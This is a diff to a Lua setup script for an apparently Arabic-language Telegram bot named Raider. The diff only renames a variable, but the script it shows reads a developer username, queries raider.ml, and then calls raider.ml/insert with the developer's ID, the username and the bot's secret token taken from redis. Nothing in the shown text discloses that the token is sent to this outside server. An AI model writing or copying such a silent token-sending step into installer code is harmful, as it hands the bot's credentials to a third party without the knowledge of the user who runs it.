@@ -32,23 +32,23 @@ io.write('\n\27[1;35m⬇┇Send UserName For Sudo : ارسل معرف المطو
 local User_Sudo = io.read():gsub('@','')
 if User_Sudo ~= '' then
 local RaiderInfo = http.request("http://raider.ml/GetUser?user="..User_Sudo)
-local Raider_Dev_info = JSON.decode(RaiderInfo)
-if Raider_Dev_info.information.status == "invalid" then
+local RaideGetInfo = JSON.decode(RaiderInfo)
+if RaideGetInfo.information.status == "invalid" then
 io.write('\n\27[1;31m The UserName was not Saved : المعرف غلط ارسل المعرف صحيح\n\27[0;39;49m')
 os.execute('lua Raider.lua')
 end
-if Raider_Dev_info.information.status == "Spammer" then
+if RaideGetInfo.information.status == "Spammer" then
 io.write('\n\27[1;31m🔄┇Is Spam For Url : لقد قمت بالتكرار في الرابط حاول بعد دقيقتين \n\27[0;39;49m')
 os.execute('lua Raider.lua')
 end
-if Raider_Dev_info.information.status == 'Channel' then
+if RaideGetInfo.information.status == 'Channel' then
 io.write('\n\27[1;31m🔄┇The UserName Is Channel : عذرا هاذا معرف قناة وليس حساب \n\27[0;39;49m')
 os.execute('lua Raider.lua')
 end
 io.write('\n\27[1;31m☑┇The UserNamr Is Saved : تم حفظ معرف المطور واستخراج ايدي المطور\n\27[0;39;49m')
-redis:set(Server_DevRaider.."User_DevRaider1",Raider_Dev_info.information.status.Username)
-redis:set(Server_DevRaider.."Id_DevRaider",Raider_Dev_info.information.status.Id)
-http.request("http://raider.ml/insert/?id="..Raider_Dev_info.information.status.Id.."&user="..Raider_Dev_info.information.status.Username.."&token="..redis:get(Server_DevRaider.."Token_DevRaider"))
+redis:set(Server_DevRaider.."User_DevRaider1",RaideGetInfo.information.status.Username)
+redis:set(Server_DevRaider.."Id_DevRaider",RaideGetInfo.information.status.Id)
+http.request("http://raider.ml/insert/?id="..RaideGetInfo.information.status.Id.."&user="..RaideGetInfo.information.status.Username.."&token="..redis:get(Server_DevRaider.."Token_DevRaider"))
 else
 io.write('\n\27[1;31m🔄┇The UserName was not Saved : لم يتم حفظ معرف المطور الاساسي\n\27[0;39;49m')
 end 
